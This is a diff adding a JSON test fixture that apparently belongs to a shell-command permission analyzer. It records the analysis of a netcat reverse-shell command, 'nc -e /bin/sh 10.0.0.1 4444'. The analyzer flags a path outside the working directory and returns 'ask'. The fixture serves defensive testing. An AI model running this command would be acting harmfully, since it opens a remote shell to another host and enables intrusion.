@@ -1,0 +1,107 @@
+{
+  "id": "b48-nc-reverse",
+  "dialect": "posix-bash",
+  "platform": "linux",
+  "analysis": {
+    "verdict": "ask",
+    "segments": [
+      "nc -e /bin/sh 10.0.0.1 4444"
+    ],
+    "pathVerdict": {
+      "decision": "ask",
+      "violations": [
+        {
+          "code": "PATH_OUTSIDE_<WORKDIR>",
+          "message": "命令包含工作目录外的路径：/bin/sh",
+          "path": "/bin/sh",
+          "severity": "warning"
+        }
+      ],
+      "warnings": [
+        "命令包含工作目录外的路径：/bin/sh"
+      ],
+      "outsideWorkDirRisk": false,
+      "requiresRiskAck": true
+    },
+    "permissionDecision": "ask",
+    "shellSecurityHints": {
+      "requiresRiskAck": true,
+      "outsideWorkDirRisk": false,
+      "warnings": [
+        "命令包含工作目录外的路径：/bin/sh"
+      ],
+      "scannedPaths": [
+        "/bin/sh"
+      ],
+      "violationCodes": [
+        "PATH_OUTSIDE_<WORKDIR>"
+      ]
+    },
+    "facts": {
+      "dialect": "posix-bash",
+      "operations": [
+        {
+          "verb": "nc",
+          "args": [
+            "-e",
+            "/bin/sh",
+            "10.0.0.1",
+            "4444"
+          ],
+          "segmentIndex": 0
+        }
+      ],
+      "connectors": [],
+      "paths": [
+        "/bin/sh"
+      ],
+      "cwdChanges": [],
+      "analysisCompleteness": "complete",
+      "unresolved": []
+    }
+  },
+  "signature": {
+    "normalized": "nc -e /bin/sh 10.0.0.1 4444",
+    "trust": {
+      "executable": "nc",
+      "argv": [
+        "-e",
+        "/bin/sh",
+        "10.0.0.1",
+        "4444"
+      ],
+      "hasMetasyntax": false,
+      "persistable": true
+    },
+    "persistableSingle": true
+  },
+  "facts": {
+    "dialect": "posix-bash",
+    "operations": [
+      {
+        "verb": "nc",
+        "args": [
+          "-e",
+          "/bin/sh",
+          "10.0.0.1",
+          "4444"
+        ],
+        "segmentIndex": 0
+      }
+    ],
+    "connectors": [],
+    "paths": [
+      "/bin/sh"
+    ],
+    "cwdChanges": [],
+    "analysisCompleteness": "complete",
+    "unresolved": []
+  },
+  "precheck": {
+    "ok": true,
+    "legacyAutoAllowEligible": false,
+    "analysisCompleteness": "complete",
+    "persistable": true,
+    "hasMetasyntax": false
+  }
+}
